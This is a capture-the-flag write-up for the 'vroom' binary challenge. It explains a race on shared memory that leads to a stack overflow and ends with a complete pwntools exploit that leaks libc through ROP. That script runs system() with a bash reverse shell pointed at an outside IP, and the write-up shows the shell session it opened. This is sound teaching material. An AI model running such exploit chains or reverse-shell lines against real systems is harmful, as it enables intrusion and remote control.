# vroom

Proposed difficulty: `Something`

3 solves

```text
nc vroom.hkn 13337
```

Attachments:

```text
drwxrwxr-x zopazz/zopazz     0 2023-11-30 12:48 handout/
-rw-rw-r-- zopazz/zopazz   248 2023-11-23 20:44 handout/Dockerfile
-rw-rw-r-- zopazz/zopazz    21 2023-11-23 20:40 handout/flag.txt
-rwxrwxr-x zopazz/zopazz 21168 2023-11-30 12:48 handout/vroom
-rwxr-xr-x zopazz/zopazz 2216304 2023-11-23 19:52 handout/libc.so.6
-rwxr-xr-x zopazz/zopazz  240936 2023-11-23 20:33 handout/ld-linux-x86-64.so.2
```

# Table of Contents

- [vroom](#vroom)
- [Table of Contents](#table-of-contents)
- [Solution](#solution)
  - [Overview](#overview)
    - [The main function](#the-main-function)
      - [mmap'ing of the car](#mmaping-of-the-car)
      - [Creating and listening on socket](#creating-and-listening-on-socket)
      - [Accepting connections](#accepting-connections)
  - [The `car` global variable](#the-car-global-variable)
  - [The application logic](#the-application-logic)
    - [`handle_client()`](#handle_client)
    - [`go_vroom_vroom()`](#go_vroom_vroom)
  - [Obtaining RIP control](#obtaining-rip-control)
  - [Leaking libc](#leaking-libc)
  - [Getting a shell](#getting-a-shell)
- [Flag](#flag)

# Solution

## Overview

The Dockerfile is very simple and just copies over the `*.so.*` files as well as the main binary (`vroom`). Then it runs the binary as a newly created user called `ctf`.

<details>

<summary>Dockerfile</summary>

```dockerfile
FROM ubuntu:latest

EXPOSE 13337

RUN apt-get update && apt-get upgrade -y

RUN mkdir /ctf

WORKDIR /ctf

COPY ld-linux-x86-64.so.2 /ctf
COPY libc.so.6 /ctf
COPY vroom /ctf
COPY flag.txt /ctf

RUN useradd -ms /bin/sh ctf

USER ctf

CMD /ctf/vroom
```

</details>

Checksec:

```text
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
```

An interesting thing to note is that this challenge does not wrap the stdin, stderr and stdout streams to the TCP connection, and instead just listens on TCP and reads and writes from the buffer.

Let's take a look at the binary in ghidra.

### The main function

Here is the `main()` function:

```c
int main(char *argv) {
  uint16_t uVar1;
  uint32_t uVar2;
  int tmpresult;
  undefined4 local_3c;
  sockaddr addr;
  sockaddr sockopts;
  socklen_t addrlen;
  __pid_t child_pid;
  int accept_fd;
  int s;

  mmap_car();
  s = socket(2,1,0);
  if (s == -1) {
    fwrite("Socket creation failed\n",1,0x17,stderr);
    exit(1);
  }
  sockopts.sa_data[6] = '\0';
  sockopts.sa_data[7] = '\0';
  sockopts.sa_data[8] = '\0';
  sockopts.sa_data[9] = '\0';
  sockopts.sa_data[10] = '\0';
  sockopts.sa_data[11] = '\0';
  sockopts.sa_data[12] = '\0';
  sockopts.sa_data[13] = '\0';
  sockopts.sa_family = 2;
  sockopts.sa_data[0] = '\0';
  sockopts.sa_data[1] = '\0';
  sockopts.sa_data[2] = '\0';
  sockopts.sa_data[3] = '\0';
  sockopts.sa_data[4] = '\0';
  sockopts.sa_data[5] = '\0';
  uVar2 = htonl(0);
  sockopts.sa_data._2_4_ = uVar2;
  uVar1 = htons(13337);
  sockopts.sa_data._0_2_ = uVar1;
  local_3c = 1;
  tmpresult = setsockopt(s, 1, 2, &local_3c, 4);
  if (tmpresult < 0) {
    fprintf(stderr, "setsockopt failed %m\n");
    exit(1);
  }
  tmpresult = bind(s, &sockopts, 0x10);
  if (tmpresult != 0) {
    fprintf(stderr, "socket bind failed: %m\n");
    exit(1);
  }

  tmpresult = listen(s, 5);

  if (tmpresult != 0) {
    fwrite("Listen failed\n", 1, 0xe, stderr);
    exit(1);
  }

  addrlen = 4;
  do {
    while( true ) {
      while( true ) {
        accept_fd = accept(s, &addr, &addrlen);
        child_pid = fork();

        if (child_pid != -1) {
          break;
        }

        close(accept_fd);
      }

      if (child_pid >= 1) {
        close(accept_fd);
      }

      break;
    }
  } while (child_pid != 0);

  handle_client(accept_fd);
  close(accept_fd);
  return 0;
}
```

Let's break the main function into three parts:

1. mmap'ing of the "car"
2. Creating and listening on socket
3. Accepting connections

#### mmap'ing of the car

In the beginning of the function it runs a function called `mmap_car()`. Let's have a look at what it does:

```c
int mmap_car(void) {
  setvbuf(stdin,(char *)0x0, 2, 0);
  setvbuf(stdout,(char *)0x0, 2, 0);
  setvbuf(stderr,(char *)0x0, 2, 0);

  car = (car *)mmap((void *)0x0, 0x1000, 3, 0x21, -1, 0);

  if (car == (car *)0xffffffffffffffff) {
    fwrite("mmap failed, if this happens on remote, contact an admin\n", 1, 0x39, stderr);
    exit(3);
  }

  return (int)car;
}
```

The important part here is that the global variable `car` is set like this:

```c
car = (car *)mmap((void *)0x0,0x1000,3,0x21,-1,0);
```

Let's look at what the `mmap(3P)` man page says

```c
void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);
```

So this call runs mmap with the following arguments:

| Argument | Value  | Meaning                                                                                                                                                                                                   |
| -------- | ------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| addr     | 0x0    | The system can choose any starting address for the newly allocated memory.                                                                                                                                |
| len      | 0x1000 | We want 4096 bytes of space to work with                                                                                                                                                                  |
| prot     | 0x3    | The new region should have the permissions rw- (no execute)                                                                                                                                               |
| flags    | 0x21   | This is a flag, 0x21 corresponds to `MAP_ANONYMOUS` and `MAP_SHARED`. This means that this new memory region does not correspond to a file, and should be shared between forks (i will come back to this) |
| fildes   | -1     | Since MAP_ANONYMOUS is used, the new memory space does not correspond to any actual file                                                                                                                  |
| off      | 0      | Since this is not a file, this argument is not important                                                                                                                                                  |

In summary, this line of code is requesting the operating system to allocate a 4 KB region of memory that the program can read from and write to. The memory is allocated anonymously (not backed by a file) and the memory region is shared between forks of this process. The result is a pointer to the allocated memory, cast to a pointer of type car.

#### Creating and listening on socket

The program creates a socket and listens on port `13337`. This can be seen in the following snippet from `main()`:

```c
  s = socket(2,1,0);
  if (s == -1) {
    fwrite("Socket creation failed\n",1,0x17,stderr);
    exit(1);
  }
  sockopts.sa_data[6] = '\0';
  sockopts.sa_data[7] = '\0';
  sockopts.sa_data[8] = '\0';
  sockopts.sa_data[9] = '\0';
  sockopts.sa_data[10] = '\0';
  sockopts.sa_data[11] = '\0';
  sockopts.sa_data[12] = '\0';
  sockopts.sa_data[13] = '\0';
  sockopts.sa_family = 2;
  sockopts.sa_data[0] = '\0';
  sockopts.sa_data[1] = '\0';
  sockopts.sa_data[2] = '\0';
  sockopts.sa_data[3] = '\0';
  sockopts.sa_data[4] = '\0';
  sockopts.sa_data[5] = '\0';
  uVar2 = htonl(0);
  sockopts.sa_data._2_4_ = uVar2;
  uVar1 = htons(13337);
  sockopts.sa_data._0_2_ = uVar1;
  local_3c = 1;
  tmpresult = setsockopt(s, 1, 2, &local_3c, 4);
  if (tmpresult < 0) {
    fprintf(stderr, "setsockopt failed %m\n");
    exit(1);
  }
  tmpresult = bind(s, &sockopts, 0x10);
  if (tmpresult != 0) {
    fprintf(stderr, "socket bind failed: %m\n");
    exit(1);
  }

  tmpresult = listen(s, 5);

  if (tmpresult != 0) {
    fwrite("Listen failed\n", 1, 0xe, stderr);
    exit(1);
  }
```

This is a bit messy as it has been decompiled. But it just creates a simple TCP socket and binds it to `0.0.0.0:13337`. Then starts listening on it.

#### Accepting connections

In the last part of the `main()` function the new connections are handled:

```c
  addrlen = 4;
  do {
    while( true ) {
      while( true ) {
        accept_fd = accept(s, &addr, &addrlen);
        child_pid = fork();

        if (child_pid != -1) {
          break;
        }

        close(accept_fd);
      }

      if (child_pid >= 1) {
        close(accept_fd);
      }

      break;
    }
  } while (child_pid != 0);

  handle_client(accept_fd);
  close(accept_fd);
  return 0;
```

Here's a breakdown of what happens:

1. The program waits until a connection occurs
2. When the connection occurs, it immediately forks the program
3. The original process goes back to waiting until the next connection occurs
4. The newly created process continues to call `handle_client(client_fd)` where `client_fd` is the file descriptor of the newly created process

When a `fork()` is executed the program splits in two. The memory layout is exactly the same between the two processes. The only difference is that the result of the `fork()` call will return 0 in the parent process, while returning the new process id (PID) in the child process.

## The `car` global variable

Before digging into the `handle_client()` function that handles the program logic, I'd like to shed some light on some information I have glossed over.

First, there is a global variable called `car`. At the beginning of the program, this pointer is set to point to some shared memory. This pointer will be used as a pointer to a struct that I have reconstructed from its usage in the `handle_client()` function. The struct looks like this:

```c
typedef struct Car {
  unsigned short trackLength;
  unsigned short carNameLength;
  char carName[256];
  char track[3585];
} Car;
```

This is the format of the data that is stored in the mmap'ed region.

Another interesting observation is that the block of memory that car is pointing to will be shared between forks. That means that all connections (even simultaneous connections) share this memory region. This happens in real time, meaning that if child A mutates the data, it will be reflected instantly in child B.

## The application logic

The main application logic contains of two functions:

1. `handle_client()` - Initializes the `car` from user input
2. `go_vroom_vroom()` - Uses the data in `car`

### `handle_client()`

Here is the decompiled, reverse-engineered and simplified source of `handle_client()`:

```c
void handle_client(int fd) {
  char track_length[8];

  // client_fd is a global variable
  client_fd = fd;

  write(fd, "Welcome to Zopazz\'s racecar factory!\n\nHow long would you like your race car\'s trail to be?\n>", 0x5c);
  read(fd, track_length, 8);

  car->trackLength = (unsigned short)atoi(track_length);

  if (car->trackLength >= 3585) {
    return;
  }

  write(fd, "Great! Now we need a name for your car!\n>", 0x29);
  read(fd, car->carName, 0xff);
  car->carNameLength = (unsigned short)strlen(car->carName);

  write(fd, "Great! All we need now is how your trail should look!\n>", 0x37);
  read(fd, car->track, car->trackLength);

  write(fd, "Now time to go vroom vroom!\n", 0x1c);
  go_vroom_vroom();
}
```

Here is a breakdown of what happens in `handle_client()`:

1. First the global variable `client_fd` is set to the connection `fd`.
2. Then the `car->trackLength` is populated. It takes user input and converts it to an unsigned short.
3. If `car->trackLength` is greater than or equal to `3585`, it will return, this leads to the connection being closed.
4. Then the `car->carName` is populated from user input. It takes at most `0xff` bytes.
5. Then the `car->track` is populated from user input. It takes at most `car->trackLength` bytes.
6. Then it calls `go_vroom_vroom()`

None of these lines are inherently vulnerable. But when paired together with the fact that we can have multiple instances of the program (connections) open that are all mutating the same data, we can actually write more than `3585` bytes to `car->track`. This is not important for the challenge, but I suggest trying to see if you can figure out how to do it as a little exercise.

<details>

<summary>How to write more than 3585 bytes (not important for the challenge)</summary>

We can write more than `3585` bytes by making use of two connections.

1. We start by opening two connections
2. In the first connection set the track length to something less than 3585.
3. Then, in the second connection, write a huge number as the track length (will at most be `65535` as it is an unsigned short)
4. Now the second connection will be closed as it will return.

The first connection is still connected, and has already passed the if statement. This means that the `car->trackLength` is more than `3585`.

This happens because the `car->trackLength` is set before checking if it is over `3585`. So even though the connection gets closed, the shared memory got changed, meaning that the `car->trackLength` is over `3585` in the first connection.

</details>

Now that we understand the `handle_client()` function, we can proceed to look into the `go_vroom_vroom()` function.

### `go_vroom_vroom()`

Ghidra did not do a very good job at decompiling this function as some cursed stuff happens.

Here's a non-complete reconstruction of what happens:

```c
void go_vroom_vroom(void) {
  unsigned short local_var;
  long lVar2;
  void *__dest;
  unsigned long alignedBufferSize;
  char *stackPtr;
  char auStack_18 [4];
  int local_14;
  void *dynamically_allocated_stack_buffer;

  // here some assembly code moves the actual RSP value to be the size of car->trackLength
  
  write(client_fd,"Press enter to go!\n>",0x14);
  __dest = dynamically_allocated_stack_buffer;
  read(client_fd,auStack_18 + 1,1);
  local_var = car->trackLength;
  memcpy(__dest,car->track,(unsigned long)local_var);
  local_var = car->trackLength;
  write(client_fd,dynamically_allocated_stack_buffer,(unsigned long)local_var);
  write(client_fd," ",1);
  local_var = car->carNameLength;
  write(client_fd,car->carName,(unsigned long)local_var);
  write(client_fd,"\n",1);
  return;
}
```

Notice that in the beginning of the function, I wrote a comment. Let's look into the assembly.

```asm
            ; CALL XREF from sym.handle_client @ 0x401762(x)
┌ 389: sym.go_vroom_vroom ();
│           ; var char *ptr @ rbp-0x8
│           ; var ssize_t var_ch @ rbp-0xc
│           ; var void *buf @ rbp-0xf
│           ; var int64_t var_ff8h @ rsp+0xff8
│           0x00401441      f30f1efa       endbr64
│           0x00401445      55             push rbp
│           0x00401446      4889e5         mov rbp, rsp
│           0x00401449      4883ec10       sub rsp, 0x10
│           0x0040144d      488b059c2c00.  mov rax, qword [obj.car]    ; [0x4040f0:8]=0
│           0x00401454      0fb700         movzx eax, word [rax]
│           0x00401457      0fb7c0         movzx eax, ax
│           0x0040145a      488d5008       lea rdx, [rax + 8]
│           0x0040145e      b810000000     mov eax, 0x10               ; 16
│           0x00401463      4883e801       sub rax, 1
│           0x00401467      4801d0         add rax, rdx
│           0x0040146a      be10000000     mov esi, 0x10               ; 16
│           0x0040146f      ba00000000     mov edx, 0
│           0x00401474      48f7f6         div rsi
│           0x00401477      486bc010       imul rax, rax, 0x10
│           0x0040147b      4889c1         mov rcx, rax
│           0x0040147e      4881e100f0ff.  and rcx, 0xfffffffffffff000
│           0x00401485      4889e2         mov rdx, rsp
│           0x00401488      4829ca         sub rdx, rcx
│           ; CODE XREF from sym.go_vroom_vroom @ 0x4014a0(x)
│       ┌─> 0x0040148b      4839d4         cmp rsp, rdx
│      ┌──< 0x0040148e      7412           je 0x4014a2
│      │╎   0x00401490      4881ec001000.  sub rsp, 0x1000
│      │╎   0x00401497      48838c24f80f.  or qword [var_ff8h], 0
│      │└─< 0x004014a0      ebe9           jmp 0x40148b
│      │    ; CODE XREF from sym.go_vroom_vroom @ 0x40148e(x)
│      └──> 0x004014a2      4889c2         mov rdx, rax
│           0x004014a5      81e2ff0f0000   and edx, 0xfff
│           0x004014ab      4829d4         sub rsp, rdx
│           0x004014ae      4889c2         mov rdx, rax
│           0x004014b1      81e2ff0f0000   and edx, 0xfff
│           0x004014b7      4885d2         test rdx, rdx
│       ┌─< 0x004014ba      7410           je 0x4014cc
│       │   0x004014bc      25ff0f0000     and eax, 0xfff
│       │   0x004014c1      4883e808       sub rax, 8
│       │   0x004014c5      4801e0         add rax, rsp
│       │   0x004014c8      48830800       or qword [rax], 0
│       │   ; CODE XREF from sym.go_vroom_vroom @ 0x4014ba(x)
│       └─> 0x004014cc      4889e0         mov rax, rsp
│           0x004014cf      4883c00f       add rax, 0xf                ; 15
│           0x004014d3      48c1e804       shr rax, 4
│           0x004014d7      48c1e004       shl rax, 4
│           0x004014db      488945f8       mov qword [ptr], rax

[TRUNCATED]
```

This is the disassembly of the beginning of the `go_vroom_vroom()` function.

Here we see that the `rsp` value is being manipulated after the stack frame has been set up. This is very unconventional, and has probably been done intentionally. This assembly essentially dynamically allocates usable memory on the stack by growing the stack frame. Whether this is a good idea, I'll leave up to you. But the fact is that something like this is happening:

1. When `go_vroom_vroom` is called, the program allocates enough data such that there is space for at least `car->trackLength` bytes in the stack frame.
2. A pointer to this newly created space (still in the stack frame) is assigned to `dynamically_allocated_stack_buffer`

After this has been done, this happens:

```c
  write(client_fd,"Press enter to go!\n>",0x14);
  __dest = dynamically_allocated_stack_buffer;
  read(client_fd,auStack_18 + 1,1);
  local_var = car->trackLength;
  memcpy(__dest,car->track,(unsigned long)local_var);
```

This is interesting, as we can potentially overflow the `__dest` (`dynamically_allocated_stack_buffer`) buffer. Since there are no stack canaries, we will be able to use overflow to gain control of the saved rip value. This means that we can potentially run a [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) chain.

## Obtaining RIP control

We can obtain control of the return pointer by doing the following:

1. Open two connections
2. The first connection has to make it to the `Press enter to go!\n>` prompt in the `go_vroom_vroom`. I will just arbitrarily select a small track length of 16.
   - This prompt happens after the dynamically allocated stack frame has been set up.
   - The idea is that we want to delay the `memcpy()` call until we have manipulated the `car` data from the second process. Because then we can copy more bytes than there is space in the stack frame, and overwrite the saved rip.
3. In the second connection, we want to set a large track, such that when copied into the stack of the first connection, it will overflow it's stack frame.

I wrote a small python script to do this:

```py
from pwn import *

HOST = "localhost"

def getremote(track: bytes | int):
    """Get a remote"""

    if isinstance(track, int):
        track = cyclic(track)

    size = len(track)

    io = remote(HOST, 13337)

    # send track length
    io.sendlineafter(b'>', str(size+1).encode())  # +1 for newline

    # send name of car
    io.sendlineafter(b'>', b'name of car')

    # send track
    io.sendlineafter(b'>', track)

    # The process has executed the beginning of the go_vroom_vroom() function
    # A single io.sendline(b'') will trigger the memcpy()

    return io

io1 = getremote(16)  # This remote has a small stack

io2 = getremote(100)
io1.sendlineafter(b'>', b'')  # This will trigger the bug
```

I will now run this script while having run the server in gdb. I will attach gdb to the first child that is created as this is the connection that will have the buffer overflow. I am just attacking with a cyclic pattern, so it should segfault when it tries to go to the saved RIP that we have overwritten. I can use the address it tries to go back to to calculate the saved rip's offset from our buffer.

In this case I can see that it tried to return to the address `0x616161706161616f`. I am using the cyclic tool from pwntools, so I can recover the offset:

```bash
$ cyclic -l 0x616161706161616f
56
```

Now that we have the offset we can set the track in io2 to be 56*'A' and then insert our ROP chain.

## Leaking libc

After gaining RIP control I noticed that we have almost no useful ROP gadgets.

We want to be able to build a ROP gadget or something similar. I want to pop a shell on the remote. The problem is that we cannot just run a `system("/bin/sh")` as you would normally do. This is due to the fact that the stdin, stderr and stdout streams are not forwarded to our TCP connection.

Since the program is dynamically linked, we will need to circumvent ASLR by leaking addresses. We will want to see if we can leak a libc address, and use that known address to calculate the base libc address.

A neat property of this challenge is that since all process children have the same memory layout, we can leak libc in any of them, and we will know the libc address in all subsequent connections.

This means that we can go crazy and make the program segfault, as it will only be a child that segfaults. So let's look for any places in the code we can jump to to dump a known address from libc.

After some looking around, I found these instructions in `go_vroom_vroom()`:

```asm
Dump of assembler code for function go_vroom_vroom:
[TRUNCATED]
  0x0000000000401541 <+256>: mov    rax,QWORD PTR [rip+0x2ba8]        # 0x4040f0 <car>
  0x0000000000401548 <+263>: movzx  eax,WORD PTR [rax]
  0x000000000040154b <+266>: movzx  edx,ax
  0x000000000040154e <+269>: mov    eax,DWORD PTR [rip+0x2ba4]        # 0x4040f8 <client_fd>
  0x0000000000401554 <+275>: mov    rcx,QWORD PTR [rbp-0x8]
  0x0000000000401558 <+279>: mov    rsi,rcx
  0x000000000040155b <+282>: mov    edi,eax
  0x000000000040155d <+284>: call   0x401170 <write@plt>
[TRUNCATED]
```

These instructions set up a function call and calls write with the following parameters:

`write(client_fd, (*$rbp)-0x8, car->trackLength);`

Since we can manipulate the data present in `rbp`, we can make it write the value at any address in the program back to us. So we just need to find a pointer to a pointer to a known address in libc. After some looking around I found the address `0x400800` which is a pointer to `setsockopt@got`, which is located at `0x404018`, which in turn points directly to the `setsockopt` function as the GOT entry has been populated:

```text
pwndbg> telescope 0x400800 1
00:0000│  0x400800 —▸ 0x404018 (setsockopt@got[plt]) —▸ 0x7ffff7ebacb0 (setsockopt) ◂— endbr64 
```

To leak libc we only need to find out how we can manipulate (rbp). After some fiddling around, I found out that we can do this by adding the address right before the saved rip.

To do this we will use the following payload:

`b'A'*48 + p64(0x400800 + 0x8) + p64(0x401541)`

Here the first address is the pointer to a pointer to setsockopt, and the second address is `go_vroom_vroom+256` where the call takes place.

After the write the program will surely crash, but that is alright as we will get our libc leak. This snippet uses the same `getremote()` function as the POC in [Obtaining RIP control](#obtaining-rip-control):

```py
io1 = getremote(16)  # This remote has a small stack

PAYLOAD = b'A'*48 + p64(0x400800 + 0x8) + p64(0x401541)

io2 = getremote(PAYLOAD)
io1.sendlineafter(b'>', b'')  # This will trigger the bug

io1.recvline()
io1.recvline()

leak = u64(io1.recv(8))

io1.close()

libc = ELF("./handout/libc.so.6", checksec=False)

libc.address = leak - libc.symbols.setsockopt

log.info(f"Libc @ {hex(libc.address)}")
```

Running this gives me the following output:

```text
[+] Opening connection to localhost on port 13337: Done
[+] Opening connection to localhost on port 13337: Done
[*] Closed connection to localhost port 13337
[*] Libc @ 0x7ffff7d93000
[*] Closed connection to localhost port 13337
```

I can confirm this address in gdb:

```text
pwndbg> x/s 0x7ffff7d93000
0x7ffff7d93000: "\177ELF\002\001\001\003"
```

We now have the libc address!

## Getting a shell

As mentioned before, we cannot just use `system("/bin/sh")` to get a shell. Instead I will now try to create a reverse shell. After fiddling around with the docker container, I found that the following reverse shell will work:

`bash -c "sh -i >& /dev/tcp/{IP address}/{port} 0>&1"`

But how do we execute this?

We want to run `system()` with our reverse shell as the first argument. To do this we will need to make `rdi` a pointer to an address that contains that text. We can easily fit this in the `0xff` bytes we have for our `car->name`. Now we just have to find the address of `car`. We can easily do this as well.

Here is my solve script:

```py
from pwn import *

HOST = "vroom.hkn"

context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./handout/vroom', checksec=False)
libc = ELF('./handout/libc.so.6', checksec=False)

context.arch = elf.arch

rop = ROP(elf)

def getremote(track: bytes | int):
    """Get a remote"""

    if isinstance(track, int):
        track = cyclic(track)

    size = len(track)

    io = remote(HOST, 13337)
    io.sendlineafter(b'>', str(size+1).encode())  # +1 for newline

    # Set name to the reverse shell
    io.sendlineafter(b'>', b'\x00'*8 +
                     b'bash -c "sh -i >& /dev/tcp/25.209.240.253/1338 0>&1"')

    io.sendlineafter(b'>', track)

    # The process has executed the beginning of the go_vroom_vroom() function
    # A single io.sendline(b'') will trigger the memcpy()


    return io


# -- Leak libc

log.info("Leaking libc")

# This will run: write(client_fd, (*$rbp)-0x8, car->trackLength)
rop.raw(p64(0x0000000000401541))

# We set RBP to 0x400800+0x8 that has a pointer to the setsockopt got entry
target_rbp = 0x400800 + 0x8

# The payload will run write(1, setsockopt@got, len(payload))
payload = b'A'*48 + p64(target_rbp) + rop.chain()


io1 = getremote(16)  # This remote has a small stack
io2 = getremote(payload)

io1.sendlineafter(b'>', b'')  # This will trigger the bug

io1.recvline()  # Garbage

setsockopt_addr = u64(io1.recv(8))  # The result of the write
libc.address = setsockopt_addr - libc.symbols.setsockopt

log.success(f'Libc @ {hex(libc.address)}')

# -- Dump car

log.info("Dumping car")

rop = ROP([elf, libc])

# Seems to always be fd 4 on io1
rop.call(libc.symbols.write, [4, elf.symbols.car, 8])

io1 = getremote(16)
io2 = getremote(b'A'*56 + rop.chain())

io1.sendlineafter(b'>', b'')

io1.recvline()  # Garbage

car_addr = u64(io1.recv(8))
log.success(f'car @ {hex(car_addr)}')

# -- Revshell

log.info("Opening revshell")

# system(car+0x4+0x8) -> revshell
io1 = getremote(16)

libc_rop = ROP(libc)

# Align stack to 16 bytes for movaps instruction
libc_rop.raw(libc_rop.ret)

libc_rop.call(libc.symbols.system, [car_addr+0x4+0x8])

io2 = getremote(b'A'*56 + libc_rop.chain())

io1.sendlineafter(b'>', b'')
```

Let's open a netcat listener and start the solve script:

```text
$ nc -lvnp 1338
Listening on 0.0.0.0 1338
Connection received on 25.209.240.1 53296
sh: 0: can't access tty; job control turned off
# ls
flag.txt
ld-linux-x86-64.so.2
libc.so.6
vroom
# cat flag.txt
DDC{W31rd_rc_1_gu3ss}# 
```

# Flag

`DDC{W31rd_rc_1_gu3ss}`
